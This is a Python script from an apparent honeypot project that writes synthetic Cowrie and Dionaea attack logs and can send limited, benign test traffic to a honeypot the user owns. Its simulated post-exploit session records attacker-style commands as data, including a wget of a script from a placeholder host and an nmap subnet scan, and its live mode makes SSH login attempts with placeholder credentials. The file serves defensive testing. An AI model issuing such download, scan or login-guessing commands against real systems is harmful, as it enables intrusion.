#!/usr/bin/env python3
"""Safe DeepHoney attack simulator.

Two modes:

``generate``
    Write synthetic Cowrie/Dionaea log lines for ingestion. No network traffic
    is sent. This is the default and the recommended demonstration path.

``live``
    Send a very small number of benign, rate-limited interactions to a
    honeypot you own. Only loopback is allowed by default. Private lab
    addresses require an explicit opt-in; public addresses are always refused.
    The simulator never sends exploit payloads, never downloads files, never
    executes commands, and only runs an allowlist of harmless SSH commands
    against the disposable honeypot shell.

Safe-by-design credentials in this file are obvious placeholders. They are
not credentials for any real system.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import time
import urllib.error
import urllib.request
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

from _bootstrap import ROOT, repository_for, settings_for
from deephoney.ingestion.pipeline import IngestionPipeline
from deephoney.utils.hashing import sha256_text
from deephoney.utils.net import validate_live_target
from deephoney.utils.time import parse_timestamp

DEMO_CREDENTIALS: tuple[tuple[str, str], ...] = (
    ("root", "DEMO_PASSWORD_NOT_REAL_01"),
    ("admin", "DEMO_PASSWORD_NOT_REAL_02"),
    ("test", "DEMO_PASSWORD_NOT_REAL_03"),
)
SAFE_SSH_COMMANDS: tuple[str, ...] = (
    "id",
    "uname -a",
    "pwd",
    "echo DEEPHONEY_SIMULATOR_OK",
)
HTTP_PATHS: tuple[str, ...] = ("/", "/deephoney-simulator-check")
PLACEHOLDER_SHA256 = sha256_text("DeepHoney synthetic artifact placeholder (not malware)\n")
USER_AGENT = "DeepHoney-Lab-Simulator/1.0 (authorized honeypot check)"
MAX_LIVE_ATTEMPTS = 10


def _event(base: datetime, offset: float, **fields: Any) -> dict[str, Any]:
    timestamp = (base + timedelta(seconds=offset)).isoformat().replace("+00:00", "Z")
    return {"timestamp": timestamp, **fields}


def _cowrie_bruteforce(base: datetime, index: int) -> list[dict[str, Any]]:
    session = f"sim-cowrie-brute-{index:04d}"
    src = f"203.0.113.{150 + index}"
    events = [
        _event(
            base,
            0,
            eventid="cowrie.session.connect",
            src_ip=src,
            src_port=50000 + index,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            message="Simulated SSH connection (authorized lab test)",
        )
    ]
    offset = 1.0
    for attempt in range(6):
        events.append(
            _event(
                base,
                offset,
                eventid="cowrie.login.failed",
                src_ip=src,
                dst_ip="192.0.2.10",
                dst_port=2222,
                session=session,
                protocol="ssh",
                username=("admin", "root", "test")[attempt % 3],
                password=f"DEMO_PASSWORD_NOT_REAL_{attempt + 1:02d}",
                message="Simulated failed login (placeholder credential)",
            )
        )
        offset += 2.0
    events.append(
        _event(
            base,
            offset,
            eventid="cowrie.login.success",
            src_ip=src,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            username="root",
            password="DEMO_PASSWORD_NOT_REAL_99",
            message="Simulated login accepted by the decoy",
        )
    )
    for command in ("uname -a", "id"):
        offset += 2.0
        events.append(
            _event(
                base,
                offset,
                eventid="cowrie.command.input",
                src_ip=src,
                dst_ip="192.0.2.10",
                dst_port=2222,
                session=session,
                protocol="ssh",
                input=command,
                message=f"CMD: {command}",
            )
        )
    events.append(
        _event(
            base,
            offset + 2,
            eventid="cowrie.session.closed",
            src_ip=src,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            duration=offset + 2,
            message="Simulated connection closed",
        )
    )
    return events


def _cowrie_post_exploit(base: datetime, index: int) -> list[dict[str, Any]]:
    session = f"sim-cowrie-post-{index:04d}"
    src = f"203.0.113.{180 + index}"
    events = [
        _event(
            base,
            0,
            eventid="cowrie.session.connect",
            src_ip=src,
            src_port=51000 + index,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            message="Simulated post-authentication session (authorized lab test)",
        ),
        _event(
            base,
            2,
            eventid="cowrie.login.success",
            src_ip=src,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            username="root",
            password="DEMO_PASSWORD_NOT_REAL_98",
            message="Simulated login accepted by the decoy",
        ),
    ]
    commands = [
        "uname -a",
        "wget http://198.51.100.20/deephoney-demo.sh",
        "crontab -l",
        "nmap -sT 192.0.2.0/24",
    ]
    offset = 4.0
    for command in commands:
        events.append(
            _event(
                base,
                offset,
                eventid="cowrie.command.input",
                src_ip=src,
                dst_ip="192.0.2.10",
                dst_port=2222,
                session=session,
                protocol="ssh",
                input=command,
                message=f"CMD: {command}",
            )
        )
        offset += 2
    events.append(
        _event(
            base,
            offset,
            eventid="cowrie.session.file_download",
            src_ip=src,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            url="http://198.51.100.20/deephoney-demo.sh",
            outfile="deephoney-demo.sh",
            filename="deephoney-demo.sh",
            size=512,
            shasum=PLACEHOLDER_SHA256,
            message="Simulated download metadata; no payload is stored",
        )
    )
    events.append(
        _event(
            base,
            offset + 2,
            eventid="cowrie.session.closed",
            src_ip=src,
            dst_ip="192.0.2.10",
            dst_port=2222,
            session=session,
            protocol="ssh",
            duration=offset + 2,
            message="Simulated connection closed",
        )
    )
    return events


def _dionaea_session(
    base: datetime,
    index: int,
    *,
    port: int,
    protocol: str,
    capture: bool,
) -> list[dict[str, Any]]:
    session = f"sim-dionaea-{protocol}-{index:04d}"
    src = f"198.51.100.{150 + index}"
    connection = {
        "connection_unique_id": session,
        "protocol": "tcp",
        "remote": {"host": src, "port": 52000 + index},
        "local": {"host": "192.0.2.10", "port": port},
    }
    events = [
        _event(base, 0, type="dionaea.connection.accepted", connection=connection),
        _event(
            base,
            1,
            type=f"dionaea.modules.python.{protocol}.request",
            connection=connection,
            message="Simulated protocol probe metadata (no payload)",
        ),
    ]
    if capture:
        events.append(
            _event(
                base,
                2,
                type=f"dionaea.modules.python.{protocol}.capture",
                connection=connection,
                capture={
                    "filename": "deephoney-demo.txt",
                    "size": 57,
                    "sha256": PLACEHOLDER_SHA256,
                    "file_type": "ASCII text placeholder",
                },
            )
        )
    events.append(_event(base, 3, type="dionaea.connection.close", connection=connection))
    return events


def generate_scenario_logs(
    out_dir: str | Path,
    *,
    scenario: str = "all",
    base_time: str | datetime | None = None,
) -> list[Path]:
    """Write synthetic JSON-lines logs and return the paths."""

    if scenario not in {"all", "ssh-bruteforce", "ssh-post-exploit", "http-probe", "ftp-probe"}:
        raise ValueError(f"Unsupported generation scenario: {scenario}")
    parsed = parse_timestamp(base_time or "2024-08-15T12:00:00Z")
    if parsed is None:
        raise ValueError("Invalid base timestamp")
    base = parsed.astimezone(UTC)
    cowrie: list[dict[str, Any]] = []
    dionaea: list[dict[str, Any]] = []
    if scenario in {"all", "ssh-bruteforce"}:
        cowrie.extend(_cowrie_bruteforce(base, 1))
    if scenario in {"all", "ssh-post-exploit"}:
        cowrie.extend(_cowrie_post_exploit(base + timedelta(minutes=5), 2))
    if scenario in {"all", "http-probe"}:
        dionaea.extend(
            _dionaea_session(
                base + timedelta(minutes=10), 3, port=8080, protocol="http", capture=False
            )
        )
    if scenario in {"all", "ftp-probe"}:
        dionaea.extend(
            _dionaea_session(
                base + timedelta(minutes=15), 4, port=2121, protocol="ftp", capture=True
            )
        )

    target = Path(out_dir).expanduser().resolve()
    target.mkdir(parents=True, exist_ok=True)
    written: list[Path] = []
    for name, rows in (("cowrie-simulated.json", cowrie), ("dionaea-simulated.json", dionaea)):
        if not rows:
            continue
        path = target / name
        path.write_text(
            "\n".join(json.dumps(row, sort_keys=True) for row in rows) + "\n",
            encoding="utf-8",
        )
        written.append(path)
    return written


def _confirm(host: str, port: int, *, assume_yes: bool) -> bool:
    if assume_yes:
        return True
    if not sys.stdin.isatty():
        print(
            "Refusing non-interactive live simulation without --yes. "
            "The live mode sends real (but benign and rate-limited) traffic.",
            file=sys.stderr,
        )
        return False
    answer = (
        input(f"Send limited simulator traffic to {host}:{port} (a honeypot you own)? [y/N] ")
        .strip()
        .lower()
    )
    return answer in {"y", "yes"}


def _live_ssh(host: str, port: int, *, max_attempts: int, timeout: float) -> dict[str, Any]:
    try:
        import paramiko
    except ImportError:
        return {
            "scenario": "ssh",
            "ok": False,
            "error": "paramiko is not installed; install requirements-simulator.lock",
            "attempts": 0,
        }
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    authenticated = False
    attempts = 0
    output: list[str] = []
    try:
        for username, password in DEMO_CREDENTIALS[:max_attempts]:
            attempts += 1
            try:
                client.connect(
                    host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    banner_timeout=timeout,
                    auth_timeout=timeout,
                    look_for_keys=False,
                    allow_agent=False,
                )
                authenticated = True
                break
            except paramiko.AuthenticationException:
                time.sleep(0.3)
                continue
            except (OSError, paramiko.SSHException) as exc:
                return {
                    "scenario": "ssh",
                    "ok": False,
                    "error": f"{type(exc).__name__}: {str(exc)[:200]}",
                    "attempts": attempts,
                }
        if authenticated:
            for command in SAFE_SSH_COMMANDS:
                _stdin, stdout, _stderr = client.exec_command(command, timeout=timeout)
                text = stdout.read(512).decode("utf-8", errors="replace").strip()
                output.append(f"{command}: {text[:200]}")
                time.sleep(0.3)
    finally:
        client.close()
    return {
        "scenario": "ssh",
        "ok": True,
        "attempts": attempts,
        "authenticated": authenticated,
        "safe_command_output": output,
        "note": "Only placeholder credentials and allowlisted commands were used.",
    }


def _live_http(host: str, port: int, *, timeout: float) -> dict[str, Any]:
    results = []
    for path in HTTP_PATHS:
        url = f"http://{host}:{port}{path}"
        request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                body = response.read(256)
                results.append(
                    {
                        "path": path,
                        "status": response.status,
                        "server": response.headers.get("Server", ""),
                        "banner_excerpt": body.decode("utf-8", errors="replace")[:100],
                    }
                )
        except (urllib.error.URLError, OSError) as exc:
            results.append({"path": path, "error": f"{type(exc).__name__}: {str(exc)[:160]}"})
        time.sleep(0.3)
    return {
        "scenario": "http",
        "ok": any("status" in row for row in results),
        "requests": results,
        "note": "Only ordinary GET requests without exploit payloads were sent.",
    }


def _live_tcp(host: str, port: int, *, timeout: float) -> dict[str, Any]:
    try:
        with socket.create_connection((host, port), timeout=timeout) as connection:
            connection.settimeout(1.0)
            try:
                banner = connection.recv(256)
            except (TimeoutError, OSError):
                banner = b""
            return {
                "scenario": "tcp-probe",
                "ok": True,
                "banner": banner.decode("utf-8", errors="replace")[:200],
                "note": "Connection and banner read only; no payload was sent.",
            }
    except OSError as exc:
        return {
            "scenario": "tcp-probe",
            "ok": False,
            "error": f"{type(exc).__name__}: {str(exc)[:200]}",
        }


def run_live_simulation(
    host: str,
    *,
    scenario: str,
    port: int,
    http_port: int,
    allow_private_lab: bool,
    max_attempts: int,
    timeout: float,
) -> dict[str, Any]:
    target = validate_live_target(host, allow_private_lab=allow_private_lab)
    results = []
    if scenario in {"all", "ssh-bruteforce", "ssh-post-exploit"}:
        results.append(_live_ssh(target, port, max_attempts=max_attempts, timeout=timeout))
    if scenario in {"all", "http-probe"}:
        results.append(_live_http(target, http_port, timeout=timeout))
    if scenario in {"all", "tcp-probe"}:
        results.append(_live_tcp(target, port, timeout=timeout))
    return {
        "mode": "live",
        "target": target,
        "scenario": scenario,
        "started_at": datetime.now(UTC).isoformat(),
        "results": results,
        "note": (
            "Limited simulator traffic only. Review the honeypot logs and dashboard. "
            "Do not use this mode against systems you do not own."
        ),
    }


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--mode", choices=["generate", "live"], default="generate")
    parser.add_argument(
        "--scenario",
        choices=[
            "all",
            "ssh-bruteforce",
            "ssh-post-exploit",
            "http-probe",
            "ftp-probe",
            "tcp-probe",
        ],
        default="all",
    )
    parser.add_argument("--out", default=str(ROOT / "data/samples/generated"))
    parser.add_argument("--base-time", default="2024-08-15T12:00:00Z")
    parser.add_argument("--host", default="127.0.0.1", help="Live target; loopback by default")
    parser.add_argument("--port", type=int, default=2222, help="Live SSH/TCP target port")
    parser.add_argument("--http-port", type=int, default=8080)
    parser.add_argument("--max-attempts", type=int, default=3)
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument(
        "--allow-private-lab",
        action="store_true",
        help="Permit an RFC1918/link-local target explicitly (never public addresses)",
    )
    parser.add_argument("--yes", action="store_true", help="Skip the interactive confirmation")
    parser.add_argument("--ingest", action="store_true", help="Ingest generated logs immediately")
    parser.add_argument("--config", default=None)
    return parser


def main() -> int:
    args = build_parser().parse_args()
    if not 1 <= args.port <= 65535 or not 1 <= args.http_port <= 65535:
        print("error: ports must be between 1 and 65535", file=sys.stderr)
        return 2
    args.max_attempts = max(1, min(args.max_attempts, MAX_LIVE_ATTEMPTS))
    args.timeout = max(0.5, min(args.timeout, 10.0))

    if args.mode == "generate":
        if args.scenario == "tcp-probe":
            print("error: tcp-probe is a live-only scenario", file=sys.stderr)
            return 2
        try:
            paths = generate_scenario_logs(
                args.out, scenario=args.scenario, base_time=args.base_time
            )
        except ValueError as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 2
        for path in paths:
            print(f"Wrote synthetic log: {path}")
        if args.ingest:
            settings = settings_for(args.config)
            repository = repository_for(settings)
            pipeline = IngestionPipeline(repository, settings)
            for path in paths:
                engine = "cowrie" if "cowrie" in path.name else "dionaea"
                result = pipeline.ingest_file(path, engine, archive=False)
                print(
                    f"Ingested {path.name}: created={result.records_created} "
                    f"skipped={result.records_skipped} sessions rebuilt"
                )
        print(
            "\nAll generated activity is synthetic. Ingest it with scripts/import_logs.py "
            "or rerun with --ingest."
        )
        return 0

    settings = settings_for(args.config)
    allow_private = args.allow_private_lab or settings.safety.allow_private_lab_targets
    try:
        target = validate_live_target(args.host, allow_private_lab=allow_private)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    if not _confirm(target, args.port, assume_yes=args.yes):
        print("cancelled", file=sys.stderr)
        return 1
    print(f"Live simulation target: {target} (authorized lab use only)")
    print("Only placeholders, ordinary GETs, and allowlisted commands are used.")
    scenario = args.scenario
    if scenario == "ftp-probe":
        scenario = "tcp-probe"
    try:
        summary = run_live_simulation(
            target,
            scenario=scenario,
            port=args.port,
            http_port=args.http_port,
            allow_private_lab=allow_private,
            max_attempts=args.max_attempts,
            timeout=args.timeout,
        )
    except RuntimeError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    print(json.dumps(summary, indent=2, default=str))
    print(
        "\nLive mode is intentionally limited. It does not exploit, download, persist, "
        "or reuse credentials. Stop if the target is not a honeypot you own."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
